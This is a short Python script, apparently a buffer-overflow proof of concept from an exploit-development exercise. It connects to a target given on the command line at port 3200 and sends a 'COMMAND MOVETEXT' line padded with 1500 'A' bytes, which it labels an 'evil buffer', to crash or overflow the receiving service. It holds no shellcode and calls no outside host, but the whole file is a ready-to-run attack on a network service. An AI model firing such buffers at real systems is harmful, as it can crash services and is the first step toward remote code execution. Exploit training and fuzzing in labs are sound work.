#!/usr/bin/python
import socket
import sys

try:
    server = sys.argv[1]
    port = 3200
    size = 1500

    inputBuffer = b"A" * size
  
    command = b"COMMAND MOVETEXT "
    command+= inputBuffer
    command+= b"\r\n"

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(command)
    s.close()
  
    print("Done!")
  
except socket.error:
    print("Could not connect!")